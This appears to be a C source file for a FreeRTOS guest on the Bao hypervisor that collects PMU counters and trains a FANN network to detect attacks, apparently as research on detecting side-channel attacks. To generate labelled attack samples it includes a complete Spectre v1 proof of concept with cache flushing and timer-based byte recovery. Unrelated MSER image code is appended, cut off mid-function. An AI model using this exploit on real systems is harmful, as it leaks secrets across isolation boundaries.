//   BenchInfo info = get_benchmark_info(VM_NUM, task_conf->task_num);
//
//   const TickType_t xFrequency = pdMS_TO_TICKS(task_conf->periodicity);
//   TickType_t xLastWakeTime = xTaskGetTickCount();
//
//   while (1) {
//     for (uint8_t bench_exe = 0; bench_exe < BENCHMARK_MAX_EXE; bench_exe++) {
//       TickType_t start = xTaskGetTickCount();
//       TickType_t deadline = start + task_conf->deadline_ms;
//
//       start_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//
// #if VM_0_REGULATION
//       HC_PMU_config_counter(
//           task_conf->pmu_counter_a,
//           vm_conf[VM_NUM].new_read_budget[task_conf->task_num],
//           vm_conf[VM_NUM].new_write_budget[task_conf->task_num], UNUSED_ARG,
//           task_conf->task_num);
//       HC_PMU_start_counter(task_conf->pmu_counter_a);
// #endif
//       info.function.pointer();
// #if VM_0_REGULATION
//       HC_PMU_stop_counter(task_conf->pmu_counter_a);
// #endif
//       TickType_t end = xTaskGetTickCount();
//
//       // deadline
//       if (!task_conf->show_exe_info) {
//         vm_conf[VM_NUM].cycle_per_period[task_conf->task_num][bench_exe] =
//             get_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//         vm_conf[VM_NUM].task_start_time[task_conf->task_num][bench_exe] =
//         start; vm_conf[VM_NUM].task_deadline[task_conf->task_num][bench_exe]
//         =
//             deadline;
//         vm_conf[VM_NUM].task_end_time[task_conf->task_num][bench_exe] = end;
//
//         if (end <= deadline)
//           vm_conf[VM_NUM].deadline_met_counter[task_conf->task_num]++;
//         else {
//           vm_conf[VM_NUM].deadline_missed_counter[task_conf->task_num]++;
//           xLastWakeTime = end;
//         }
//       }
//
//       vTaskDelayUntil(&xLastWakeTime, xFrequency);
//     }
//
//     xLastWakeTime = xTaskGetTickCount();
//
// #if !VM_0_REGULATION
//     if (!task_conf->show_exe_info) {
//       // vTaskDelay(3000);
//       vTaskDelay(1000);
//       print_end_info_no_reg(VM_NUM, task_conf->task_num,
//       pcTaskGetName(NULL));
//     }
// #endif
//     task_conf->show_exe_info = 1;
//   }
// }

void stress_task(void *pvParameters) {
  info_t *info = (info_t *)pvParameters;

  while (true) {
    info->function.pointer(info->function.context); // full core usage
  }
}

void delayed_task(void *pvParameters) {
  info_t *info = (info_t *)pvParameters;

  const TickType_t period = pdMS_TO_TICKS(info->periodicity);
  TickType_t last_wake_time = xTaskGetTickCount();

  while (!end_application) {
    info->function.pointer(info->function.context);

    TickType_t now = xTaskGetTickCount();
    if ((now - last_wake_time) > period) {
      info->task_overruns += 1;
      last_wake_time = now;
    } else {
      info->task_underruns += 1;
    }

    vTaskDelayUntil(&last_wake_time, period);
  }

  vTaskDelete(NULL);
}


int _gettimeofday(struct timeval *tv, void *tz) {
    if (tv) {
        tv->tv_sec = 0;
        tv->tv_usec = 0;
    }
    return 0;
}

int _open(const char *name, int flags, int mode) { return -1; }

void exportar_datasets_csv(struct fann_train_data *data) {
    if (data == NULL) return;

    // printf("== EXPORTANDO DADOS ==\n");
    // printf("BranchMiss_Norm,CacheMiss_Norm,Instr_Norm,Cycles_Norm,Label\n");

    for(unsigned int i = 0; i < data->num_data; i++) {
        printf("%lu,%lu,%lu,%lu,%lu\n",
               data->input[i][0], // Branch Misses Normalizado
               data->input[i][1], // Cache Misses Normalizado
               data->input[i][2], // Instructions Normalizado
               data->input[i][3], // CPU Cycles Normalizado
               data->output[i][0] // Label (0 ou 1)
        );
        fflush(stdout);
        //pequeno delay a cada 50 linhas para não saturar o buffer da UART se o dataset for gigante
        if (i % 50 == 0) {
             for(volatile int k=0; k<1000; k++); 
        }
    }
    // printf("== FIM DOS DADOS ==\n");
}


//=======================================================================
//tasks
//=======================================================================

#define HC_SEC_MONITOR 19
#define SMCC64_FID_VND_HYP_SRVC 0x86000000 | 0x40000000
// #define HC_REGULATOR_GET_RAW_PMU_VALUES 15

// IDs de Eventos para Configuração Inicial (ARMv8)
#define ARMV8_EVENT_BR_MIS_PRED         0x10
#define ARMV8_EVENT_L1D_CACHE_REFILL    0x03
#define ARMV8_EVENT_INST_RETIRED        0x08
#define ARMV8_EVENT_CPU_CYCLES          0x11

typedef struct {
  unsigned long branch_misses;
  unsigned long cache_misses;
  unsigned long instructions;
  unsigned long cpu_cycles;
} PMU_data;

typedef struct {
    PMU_data data;
    float output;
} FANN_sample;

//Fila para comunicação entre task de monitoramento e task FANN
QueueHandle_t xPmuQueue;
//Variável global para controle de ataque
volatile float g_label_atual = 0.0f;

unsigned long hypercall(unsigned long hc_id, unsigned long arg) {

  const unsigned long full_id = SMCC64_FID_VND_HYP_SRVC | hc_id;

  register int r0 asm("x0") = full_id;
  register int r1 asm("x1") = arg;
  
  asm volatile(
    "hvc #0"
    : "+r"(r0)
    : "r"(r1)
    : "memory", "x2", "x3"
  );
    return r0;
}

void bao_get_pmu_data(PMU_data *data) {
  
    const unsigned long full_id = SMCC64_FID_VND_HYP_SRVC | HC_SEC_MONITOR;
  
    register unsigned long r0 asm("x0") = full_id;
    register unsigned long r1 asm("x1") = 0;
    register unsigned long r2 asm("x2") = 0;
    register unsigned long r3 asm("x3") = 0;
  
  // Executa a Hypercall e diz ao compilador que x0-x3 terão as saídas
  asm volatile(
    "hvc #0"
    : "+r"(r0), "=r"(r1), "=r"(r2), "=r"(r3) // Saídas
    : 
    : "memory"
  ); 
      
    data->branch_misses = r0;
    data->cache_misses = r1;
    data->instructions = r2;
    data->cpu_cycles = r3;
  }

void task_monitor(void *arg) {
  const TickType_t xPeriod = pdMS_TO_TICKS(250);
  TickType_t xLastWakeTime = xTaskGetTickCount();
  
  FANN_sample sample;
  
    // printf("[MONITOR] Configurando PMU via Hypervisor...\n");

    //C0 = Branch Misses
    HC_PMU_config_counter(0, MAX_INT, MAX_INT, ARMV8_EVENT_BR_MIS_PRED, 0);
    //C1 = Cache Misses
    HC_PMU_config_counter(1, MAX_INT, MAX_INT, ARMV8_EVENT_L1D_CACHE_REFILL, 0);
    //C2 = Instructions
    HC_PMU_config_counter(2, MAX_INT, MAX_INT, ARMV8_EVENT_INST_RETIRED, 0);
    //C3 = Cycles
    HC_PMU_config_counter(3, MAX_INT, MAX_INT, ARMV8_EVENT_CPU_CYCLES, 0);

    //habilita contadores inicialmente
    for(int i=0; i<4; i++) HC_PMU_start_counter(i);

    while(1) {
        vTaskDelayUntil(&xLastWakeTime, xPeriod);

        bao_get_pmu_data(&sample.data);
        //envia os dados coletados para a fila
        sample.output = g_label_atual;
        
        xQueueSend(xPmuQueue, &sample, 0);
    }
  }
  
  void task_A(void* arg) {
    vTaskDelay(pdMS_TO_TICKS(1000)); 
    const TickType_t xPeriod = pdMS_TO_TICKS(6000); 
    TickType_t xLastWakeTime = xTaskGetTickCount();
    
    while(1) {
    vTaskDelayUntil(&xLastWakeTime, xPeriod);
    
    g_label_atual = 0.0f; //normal
    // printf("rodando task A por 1s\n");
    // fflush(stdout);
    
    TickType_t end = xTaskGetTickCount() + pdMS_TO_TICKS(1000);
    volatile int x = 0;
    while(xTaskGetTickCount() < end) { x++; } //busy wait
  }
}

void task_B(void* arg) {
  vTaskDelay(pdMS_TO_TICKS(2000)); //delay inicial
  const TickType_t xPeriod = pdMS_TO_TICKS(6000); 
  TickType_t xLastWakeTime = xTaskGetTickCount();

  while(1) {
    vTaskDelayUntil(&xLastWakeTime, xPeriod);

    g_label_atual = 0.0f; //normal
    // printf("rodando task B por 1s\n");
    // fflush(stdout);
    
    TickType_t end = xTaskGetTickCount() + pdMS_TO_TICKS(1000);
    volatile int x = 0;
    while(xTaskGetTickCount() < end) { x++; }
  }
}

void task_benchmark(void* arg) {
  info_t *info = (info_t *)arg; 
  const TickType_t xPeriod = pdMS_TO_TICKS(1000);

  vTaskDelay(pdMS_TO_TICKS(500)); 

  TickType_t xLastWakeTime = xTaskGetTickCount();

  while(1) {
    vTaskDelayUntil(&xLastWakeTime, xPeriod);

    g_label_atual = 0.0f; //normal
    // printf("Rodando Benchmark...\n");
    // fflush(stdout);
    
    if (info != NULL) info->function.pointer(info->function.context);

    // printf("Benchmarks finalizados\n");
    // fflush(stdout);
  }
}

void task_attacker(void *arg) {
  vTaskDelay(pdMS_TO_TICKS(3000));
  const TickType_t xPeriod = pdMS_TO_TICKS(4000);
  TickType_t xLastWakeTime = xTaskGetTickCount();

  const int ARR_SIZE = 64 * 1024; 
  volatile int *arr = (int*) malloc(ARR_SIZE * sizeof(int));
  if(!arr) { /* printf("Erro Malloc Attacker\n"); */ vTaskDelete(NULL); }
  
  srand(42);

  while(1) {
    vTaskDelayUntil(&xLastWakeTime, xPeriod);
    
    g_label_atual = 1.0f; //ATAQUE
    // printf("rodando ataque\n");
    // fflush(stdout);
    
    TickType_t end = xTaskGetTickCount() + pdMS_TO_TICKS(1000);
    
    while(xTaskGetTickCount() < end) {
        int idx = rand() % ARR_SIZE;
        arr[idx]++; 
        if((rand() % 100) > 50) asm("nop"); 
    }
    // printf("Ataque finalizado\n");
    // fflush(stdout);
  }
}

//definiçoes necessarias para o spectre
unsigned int array1_size = 16;
uint8_t unused1[64]; // Padding para evitar fetch de cache adjacente
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64]; 
uint8_t array2[256 * 512];
char *secret = "The Magic Words are Squeamish Ossifrage.";
volatile uint8_t temp_spectre = 0; // Variável para evitar otimização do compilador

void victim_function(size_t x) {
    if (x < array1_size) {
        temp_spectre &= array2[array1[x] * 512];
    }
}

void read_memory_byte_spectre(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++) results[i] = 0;

    for (tries = 999; tries > 0; tries--) {
        //flush array2 da cache
        for (i = 0; i < 256; i++) {
            __asm volatile("dc civac, %0" : : "r"(&array2[i * 512]) : "memory");
        }

        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            //flush array1_size para forçar execuçao especulativa no branch
            __asm volatile("dc civac, %0" : : "r"(&array1_size) : "memory");
            
            //delay
            for (volatile int z = 0; z < 100; z++) {}

            //treinamento do preditor
            //x = training_x se j % 6 != 0, senão malicious_x
            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));

            victim_function(x); //chhama a função vítima
        }

        //medicao de tempo
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            
            //barreiras e leitura do contador de ciclos (cntvct_el0)
            __asm volatile("dsb sy \n isb \n mrs %0, cntvct_el0 \n isb \n dsb sy" : "=r" (time1) : : "memory");
            junk = *addr;
            __asm volatile("dsb sy \n isb \n mrs %0, cntvct_el0 \n isb \n dsb sy" : "=r" (time2) : : "memory");
            uint64_t diff = time2 - time1;

            if (diff <= (uint64_t)cache_hit_threshold && mix_i != array1[tries % array1_size]) {
                results[mix_i]++;
            }
        }
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;
    }

    //atribui os valores para que a task_spectre possa imprimir
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

void task_spectre(void *arg) {
    // vTaskDelay(pdMS_TO_TICKS(3000));
    const TickType_t xPeriod = pdMS_TO_TICKS(1000); 
    TickType_t xLastWakeTime = xTaskGetTickCount();
    
    //configurações do ataque
    int cache_hit_threshold = 20;
    size_t malicious_x = (size_t)(secret - (char *)array1);
    uint8_t value[2];
    int score[2];

    while(1) {
        vTaskDelayUntil(&xLastWakeTime, xPeriod);

        g_label_atual = 1.0f; //sinaliza ataque para a FANN
        // printf("[SPECTRE] Iniciando extração de dados especulativa...\n");

        for (int i = 0; i < 10; i++) { //tenta ler os primeiros 10 bytes do segredo
            read_memory_byte_spectre(cache_hit_threshold, malicious_x++, value, score);
            /* printf("[SPECTRE] Lendo: 0x%02X='%c' score=%d\n", value[0], 
                   (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]); */
            // fflush(stdout);
        }

        // printf("[SPECTRE] Ciclo de ataque finalizado.\n");
        // fflush(stdout);
        g_label_atual = 0.0f; //retorna ao estado normal
    }
}

void task_random(void* arg) {
  info_t *info = (info_t *)arg;

  //configurações do ataque
  int cache_hit_threshold = 20;
  size_t malicious_x = (size_t)(secret - (char *)array1);
  uint8_t value[2];
  int score[2];

  // vTaskDelay(pdMS_TO_TICKS(3000)); //roda no final do ciclo
  const TickType_t xPeriod = pdMS_TO_TICKS(2000);
  TickType_t xLastWakeTime = xTaskGetTickCount();

  while(1) {
    vTaskDelayUntil(&xLastWakeTime, xPeriod);

    int rand_var = rand() % 2;

    if (rand_var == 0) {
      g_label_atual = 0.0f; //normal
      // printf("Rodando Benchmark...\n");
      if (info != NULL) info->function.pointer(info->function.context);
      // fflush(stdout);
    } else {
      g_label_atual = 1.0f; //sinaliza ataque para a FANN
      // printf("[SPECTRE] Iniciando extração de dados especulativa...\n");
      // fflush(stdout);

      for (int i = 0; i < 10; i++) { //tenta ler os primeiros 10 bytes do segredo
          read_memory_byte_spectre(cache_hit_threshold, malicious_x++, value, score);
          // printf("[SPECTRE] Lendo: 0x%02X='%c' score=%d\n", value[0], 
                  // (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
          // fflush(stdout);
      }

      // printf("[SPECTRE] Ciclo de ataque finalizado.\n");
      // fflush(stdout);
    }
  }
}

#define NORM_BRANCH      100000000.0f
#define NORM_CACHE       50000000.0f 
#define NORM_INSTR       200000000.0f
#define NORM_CYCLES      400000000.0f

#define WINDOW_SIZE 5
FANN_sample window_buffer[WINDOW_SIZE];
int buffer_index = 0;
int buffer_filled = 0;

void update_window(FANN_sample new_sample) {
    window_buffer[buffer_index] = new_sample;
    buffer_index = (buffer_index + 1) % WINDOW_SIZE;
    if (buffer_index == 0) buffer_filled = 1;
}

void get_flattened_window(fann_type *input_vector) {
    int current = buffer_index; 
    
    
    for (int i = 0; i < WINDOW_SIZE; i++) {
        int idx = (buffer_index + i) % WINDOW_SIZE; 
        
        input_vector[i*4 + 0] = (fann_type)window_buffer[idx].data.branch_misses / NORM_BRANCH;
        input_vector[i*4 + 1] = (fann_type)window_buffer[idx].data.cache_misses / NORM_CACHE;
        input_vector[i*4 + 2] = (fann_type)window_buffer[idx].data.instructions / NORM_INSTR;
        input_vector[i*4 + 3] = (fann_type)window_buffer[idx].data.cpu_cycles / NORM_CYCLES;
    }
}

struct fann_train_data* cria_dataset(unsigned int num_amostras) {

  //cria dataset com o tamanho correto das amostras na fila
  struct fann_train_data *data = fann_create_train(num_amostras, 4, 1);
  if (data == NULL) {
        // printf("[ERRO] Falha ao alocar dataset\n");
        return NULL;
    }

  FANN_sample buffer;
  unsigned int coletados = 0;

  while(coletados < num_amostras) {
    if(xQueueReceive(xPmuQueue, &buffer, portMAX_DELAY)) {
        update_window(buffer);

        if (buffer_filled) {
            get_flattened_window(data->input[coletados]);
            
            data->output[coletados][0] = (fann_type)buffer.output;
            
            coletados++;
        }
    }
}
  return data;
}

void task_fann(void *arg) {
    const unsigned int num_input = 4;
    const unsigned int num_output = 1;
    const unsigned int num_layers = 3;
    const unsigned int num_neurons_hidden = 10;
    const float desired_error = 0.001f;
    const unsigned int max_epochs = 1;
    
    struct fann *ann = fann_create_standard(num_layers, num_input, num_neurons_hidden, num_output);
    fann_set_activation_function_hidden(ann, FANN_SIGMOID);
    fann_set_activation_function_output(ann, FANN_SIGMOID);

    //carrega pesos treinados
    #ifdef NUM_PESOS
    
    //aloca estrutura temporaria para passar os pesos
    struct fann_connection *conexoes = (struct fann_connection *)malloc(NUM_PESOS * sizeof(struct fann_connection));
    
    if (conexoes) {
        //recupera a estrutura de conexoes da rede vazia
        fann_get_connection_array(ann, conexoes);
        
        //substitui os pesos aleatórios pelos pesos treinados
        for(int i=0; i<NUM_PESOS; i++) {
            conexoes[i].weight = (fann_type)pesos_iniciais[i];
        }
        
        //aplica os pesos de volta na rede
        fann_set_weight_array(ann, conexoes, NUM_PESOS);
        free(conexoes);
        // printf("[FANN] Rede carregada e pronta!\n");
    }
    #endif
    
    vTaskDelay(pdMS_TO_TICKS(1000)); //roda no final do ciclo
    const TickType_t xPeriod = pdMS_TO_TICKS(2000);
    TickType_t xLastWakeTime = xTaskGetTickCount();
    
    int i = 0;
    while(1) {
      vTaskDelayUntil(&xLastWakeTime, xPeriod);
      
      // printf("rodando FANN (iteracao %d)\n", i++);
      
      //verifica quantos dados chegaram
      int amostras = uxQueueMessagesWaiting(xPmuQueue);
      
      if (amostras > 5) {
          struct fann_train_data *train_data = cria_dataset(amostras);
          
          if (train_data) {
            float predicao_media = 0.0f;
            for(int k=0; k<train_data->num_data; k++) {
                fann_type *out = fann_run(ann, train_data->input[k]);
                predicao_media += out[0];
            }
            predicao_media /= train_data->num_data;

            // exportar_datasets_csv(train_data);

            // printf("FANN Monitor: Real=%.0f Predito=%.2f\n", 
              // train_data->output[0][0], predicao_media);

            if (abs(train_data->output[0][0] - predicao_media) > 0.5) {
                // printf("[AUTO-AJUSTE] Refinando pesos...\n");
                fann_train_on_data(ann, train_data, 1, 0, 0.001f); 
            }

            fann_destroy_train(train_data);
          }
      } else {
          // printf("FANN: Sem dados suficientes (%d)\n", amostras);
      }
      
      // printf("Treino FANN finalizado\n");
    }
}

int main(void) {
  initialize_all_benchmark_contexts();
  benchmark = benchmark_create();
  benchmark_init(benchmark);

  print_vm_header();
  
  //cria fila para comunicação PMU -> FANN
  xPmuQueue = xQueueCreate(100, sizeof(FANN_sample));
  if(xPmuQueue == NULL) {
      // printf("Erro: fila nao criada\n");
      while(1);
  }

  //inicializa contador pmu
  HC_PMU_config_counter(PMU_COUNTER_1, MAX_INT, MAX_INT, CPU_CYCLE, UNUSED_ARG);
  
#if VM_0_REGULATION
  irq_set_handler(PMU_0_OVERFLOWED_ID, sgi_pmu_0);
  irq_enable(PMU_0_OVERFLOWED_ID);
  irq_set_prio(PMU_0_OVERFLOWED_ID, 0);

  irq_set_handler(PMU_1_OVERFLOWED_ID, sgi_pmu_1);
  irq_enable(PMU_1_OVERFLOWED_ID);
  irq_set_prio(PMU_1_OVERFLOWED_ID, 0);

  xTaskCreate(ctrl_task, "vm_ctrl_task", 1400, NULL, CTRL_TASK_PRIORITY, NULL);
#endif


  xTaskCreate(
    task_monitor,
    "taskMonitor",
    TASK_STACK_SIZE,
    NULL,
    OTHER_TASK_PRIORITY,
    NULL
  );

  // xTaskCreate(
  //   task_A,
  //   "taskA",
  //   TASK_STACK_SIZE,
  //   NULL,
  //   OTHER_TASK_PRIORITY,
  //   NULL
  // );

  // xTaskCreate(
  //   task_B,
  //   "taskB",
  //   TASK_STACK_SIZE,
  //   NULL,
  //   OTHER_TASK_PRIORITY,
  //   NULL
  // );
  
  info_t *info_bench = benchmark_add_info(benchmark, VM_NUM, 0, PERIOD_MS_TASK_ANY);

  //inicializa array2 para o ataque spectre
  for (int i = 0; i < (int)sizeof(array2); i++) {
        array2[i] = 1; 
    }

  xTaskCreate(
    task_random,
    "taskRandom",
    TASK_STACK_SIZE,
    info_bench,
    OTHER_TASK_PRIORITY,
    NULL
  );


  // xTaskCreate(
  //   task_spectre,
  //   "taskSpectre",
  //   TASK_STACK_SIZE, //stack maior para lidar com array2 e operacoes
  //   NULL,
  //   OTHER_TASK_PRIORITY,
  //   NULL
  // );


  // xTaskCreate(
  //   task_benchmark,
  //   "taskBenchmark",
  //   TASK_STACK_SIZE,
  //   info_bench,
  //   OTHER_TASK_PRIORITY,
  //   NULL
  // );

  // xTaskCreate(
  //   task_attacker,
  //   "taskAttacker",
  //   TASK_STACK_SIZE,
  //   info_bench,
  //   OTHER_TASK_PRIORITY,
  //   NULL
  // );
  
  xTaskCreate(
    task_fann,
    "taskFANN",
    8192,
    NULL,
    OTHER_TASK_PRIORITY,
    NULL
  );

 /*
  for (int task_num = 0; task_num < TASK_QUANTITY; ++task_num) {
    info_t *info =
        benchmark_add_info(benchmark, VM_NUM, task_num, PERIOD_MS_TASK_ANY);
    TaskHandle_t handler;
    xTaskCreate(
        delayed_task,            //
        info->function.name,     //
        TASK_STACK_SIZE,         //
        info,                    // pvParameters to delayed_task
        OTHER_TASK_PRIORITY,     // priority
        &task_handlers[task_num] // where to store the retuned TaskHandler_t
    );

    if (task_handlers[task_num] == NULL) {
      // printf("NULL task_handle, returning\n");
      return 0;
    } else {
      PRINT("got %s (%d)\n", info->function.name, info->function.index);
    }
  }
 */

  config_counter();
  start_counter();

  vTaskStartScheduler();
  while (true) {
    //
  }
  benchmark_destroy(benchmark);
  free_all_benchmark_contexts();
  // printf("\nReturning from main.\n");
  return 0;
}

/*-----------------------------------------------------------*/
void vApplicationDaemonTaskStartupHook(void) {
  printf("vApplicationDaemonTaskStartupHook(void)\n");
}

void vApplicationMallocFailedHook(void) {
  /* vApplicationMallocFailedHook() will only be called if
         configUSE_MALLOC_FAILED_HOOK is set to 1 in FreeRTOSConfig.h.  It is a
     hook function that will get called if a call to pvPortMalloc() fails.
         pvPortMalloc() is called internally by the kernel whenever a task,
     queue, timer or semaphore is created.  It is also called by various parts
     of the demo application.  If heap_1.c or heap_2.c are used, then the size
     of the heap available to pvPortMalloc() is defined by configTOTAL_HEAP_SIZE
     in FreeRTOSConfig.h, and the xPortGetFreeHeapSize() API function can be
     used to query the size of free heap space that remains (although it does
     not provide information on how the remaining heap might be fragmented). */
  printf("vApplicationMallocFailedHook(void)\n");
  taskDISABLE_INTERRUPTS();
  for (;;)
    ;
}

void vApplicationIdleHook(void) {
  /* vApplicationIdleHook() will only be called if configUSE_IDLE_HOOK is set
         to 1 in FreeRTOSConfig.h.  It will be called on each iteration of the
     idle task.  It is essential that code added to this hook function never
     attempts to block in any way (for example, call xQue     ueReceive() with a
     block time specified, or call vTaskDelay()).  If the application makes use
     of the vTaskDelete() API function (as this demo application does) then it
     is also important that vApplicationIdleHook() is permitted to return to its
     calling function, because it is the responsibility of the idle task to
     clean up memory allocated by the kernel to any task that has since been
     deleted. */

  printf("void vApplicationIdleHook(void)\n");
}

void vApplicationStackOverflowHook(TaskHandle_t pxTask, char *pcTaskName) {
  (void)pcTaskName;
  (void)pxTask;

  /* Run time stack overflow checking is performed if
         configCHECK_FOR_STACK_OVERFLOW is defined to 1 or 2.  This hook
         function is called if a stack overflow is detected. */
  printf(
      "vApplicationStackOverflowHook(TaskHandle_t pxTask, char *pcTaskName)\n");
  taskDISABLE_INTERRUPTS();
  for (;;)
    ;
}

void vApplicationTickHook(void) {
  printf("vApplicationTickHook(void)\n");
  for (;;)
    ;
}

void vAssertCalled(void) {
  printf("vAssertCalled(void)\n");
  volatile uint32_t ulSetTo1ToExitFunction = 0;

  taskDISABLE_INTERRUPTS();
  while (ulSetTo1ToExitFunction != 1) {
    __asm volatile("NOP");
  }
}

/* This version of vApplicationAssert() is declared as a weak symbol to allow it
   to be overridden by a version implemented within the application that is
   using this BSP. */
void vApplicationAssert(const char *pcFileName, uint32_t ulLine) {
  printf("vApplicationAssert( const char *pcFileName, uint32_t ulLine )\n");
  volatile uint32_t ul = 0;
  volatile const char *pcLocalFileName =
      pcFileName; /* To prevent pcFileName being optimized away. */
  volatile uint32_t ulLocalLine =
      ulLine; /* To prevent ulLine being optimized away. */

  /* Prevent compile warnings about the following two variables being set but
     not referenced.  They are intended for viewing in the debugger. */
  (void)pcLocalFileName;
  (void)ulLocalLine;

  printf("Assert failed in file %s, line %lu\r\n", pcLocalFileName,
         ulLocalLine);

  /* If this function is entered then a call to configASSERT() failed in the
     FreeRTOS code because of a fatal error.  The pcFileName and ulLine
     parameters hold the file name and line number in that file of the assert
     that failed.  Additionally, if using the debugger, the function call stack
     can be viewed to find which line failed its configASSERT() test.  Finally,
     the debugger can be used to set ul to a non-zero value, then step out of
     this function to find where the assert function was entered. */
  taskENTER_CRITICAL();
  {
    while (ul == 0) {
      __asm volatile("NOP");
    }
  }
  taskEXIT_CRITICAL();
}

I2D *mser(I2D *I, int in_delta) {
  idx_t i, rindex = 0;
  int k;
  int nout = 1;

  // int OUT_REGIONS=0;
  // int OUT_ELL = 1;
  // int OUT_PARENTS = 2;
  // int OUT_AREA = 3;
  int BUCKETS = 256;

  I2D *out;

  // int IN_I = 0;
  // int IN_DELTA = 1;

  /* configuration */
  // int verbose = 1 ;      /* be verbose                              */
  int small_cleanup = 1; /* remove very small regions               */
  int big_cleanup = 1;   /* remove very big regions                 */
  int bad_cleanup = 0;   /* remove very bad regions                 */
  int dup_cleanup = 1;   /* remove duplicates                       */
  val_t delta;           /* stability delta                         */

  /* node value denoting a void node */
  idx_t const node_is_void = 0xffffffff;

  iArray *subs_pt;     /* N-dimensional subscript                 */
  iArray *nsubs_pt;    /* diff-subscript to point to neigh.       */
  uiArray *strides_pt; /* strides to move in image array          */
  uiArray *visited_pt; /* flag                                    */

  int nel;        /* number of image elements (pixels)       */
  int ner = 0;    /* number of extremal regions              */
  int nmer = 0;   /* number of maximally stable              */
  int ndims;      /* number of dimensions                    */
  iArray *dims;   /* dimensions                              */
  int njoins = 0; /* number of join ops                      */

  I2D *I_pt;            /* source image                            */
  pair_t *pairs_pt;     /* scratch buffer to sort pixels           */
  node_t *forest_pt;    /* the extremal regions forest             */
  region_t *regions_pt; /* list of extremal regions found          */
  // int regions_pt_size;
  // int pairs_pt_size;
  // int forest_pt_size;

  /* ellipses fitting */
  ulliArray *acc_pt; /* accumulator to integrate region moments */
  ulliArray *ell_pt; /* ellipses parameters                     */
  int gdl;           /* number of parameters of an ellipse      */
  uiArray *joins_pt; /* sequence of joins                       */

  delta = 0;
  delta = in_delta;

  /* get dimensions */
  unsigned char sdims[16];
  nel = I->height * I->width; /* number of elements of src image */
  ndims = 2;
  dims = (iArray *)sdims; // malloc(sizeof(iArray) + sizeof(int)*ndims);

  I_pt = I;

  sref(dims, 0) = I->height;
  sref(dims, 1) = I->width;

  /* allocate stuff */
  // subs_pt = malloc(sizeof(iArray) + sizeof(int)*ndims);
  unsigned char ssubs_pt[16];
  subs_pt = (iArray *)ssubs_pt;

  unsigned char snsubs_pt[16];
  nsubs_pt = (iArray *)snsubs_pt; // malloc(sizeof(iArray) + sizeof(int)*ndims);

  strides_pt = (uiArray *)
      sstrides_pt; // malloc(sizeof(uiArray)+sizeof(unsigned int)*ndims);
  visited_pt = (uiArray *)
      svisited_pt; // malloc(sizeof(uiArray) + sizeof(unsigned int)*nel);
  joins_pt = (uiArray *)
      sjoins_pt; // malloc(sizeof(uiArray) + sizeof(unsigned int)*nel);

  regions_pt = (region_t *)sregion_pt; // malloc(sizeof(region_t)*nel);
  // regions_pt_size = nel;

  pairs_pt = (pair_t *)spairs_pt; // malloc(sizeof(pair_t)*nel);
  // pairs_pt_size = nel;

  forest_pt = (node_t *)sforest_pt; // malloc(sizeof(node_t)*nel);
  // forest_pt_size = nel;

  /* compute strides to move into the N-dimensional image array */
  sref(strides_pt, 0) = 1;
  for (k = 1; k < ndims; ++k) {
    sref(strides_pt, k) = sref(strides_pt, k - 1) * sref(dims, k - 1);
  }

  /* sort pixels in increasing order of intensity: using Bucket Sort */
  {
    int unsigned buckets[BUCKETS];
    memset(buckets, 0, sizeof(int unsigned) * BUCKETS);

    for (i = 0; i < nel; ++i) {
      val_t v = asubsref(I_pt, i);
      ++buckets[v];
    }

    for (i = 1; i < BUCKETS; ++i) {
      arrayref(buckets, i) += arrayref(buckets, i - 1);
    }

    for (i = nel; i >= 1;) {
      val_t v = asubsref(I_pt, --i);
      idx_t j = --buckets[v];
      pairs_pt[j].value = v;
      pairs_pt[j].index = i;
    }
  }

  /* initialize the forest with all void nodes */
  for (i = 0; i < nel; ++i) {
    forest_pt[i].parent = node_is_void;
  }

  /* number of ellipse free parameters */
  gdl = ndims * (ndims + 1) / 2 + ndims;

  /* -----------------------------------------------------------------
   *                                     Compute extremal regions tree
   * -------------------------------------------------------------- */

  for (i = 0; i < nel; ++i) {
    /* pop next node xi */
    idx_t index = pairs_pt[i].index;
    val_t value = pairs_pt[i].value;

    /* this will be needed later */
    rindex = index;

    /* push it into the tree */
    forest_pt[index].parent = index;
    forest_pt[index].shortcut = index;
    forest_pt[index].area = 1;
#ifdef USE_RANK_UNION
    forest_pt[index].height = 1;
#endif

    /* convert index into a subscript sub; also initialize nsubs
       to (-1,-1,...,-1) */
    {
      idx_t temp = index;
      for (k = ndims - 1; k >= 0; --k) {
        sref(nsubs_pt, k) = -1;
        sref(subs_pt, k) = temp / sref(strides_pt, k);
        temp = temp % sref(strides_pt, k);
      }
    }

    /* process neighbors of xi */
    while (1) {
      int good = 1;
      idx_t nindex = 0;

      /* compute NSUBS+SUB, the correspoinding neighbor index NINDEX
         and check that the pixel is within image boundaries. */
      for (k = 0; k < ndims && good; ++k) {
        int temp = sref(nsubs_pt, k) + sref(subs_pt, k);
        good &= 0 <= temp && temp < sref(dims, k);
        nindex += temp * sref(strides_pt, k);
      }

      /* keep going only if
         1 - the neighbor is within image boundaries;
         2 - the neighbor is indeed different from the current node
         (this happens when nsub=(0,0,...,0));
         3 - the nieghbor is already in the tree, meaning that
         is a pixel older than xi.
      */
      if (good && nindex != index && forest_pt[nindex].parent != node_is_void) {
        idx_t nrindex = 0, nvisited;
        val_t nrvalue = 0;

#ifdef USE_RANK_UNION
        int height = forest_pt[rindex].height;
        int nheight = forest_pt[nrindex].height;
#endif

        /* RINDEX = ROOT(INDEX) might change as we merge trees, so we
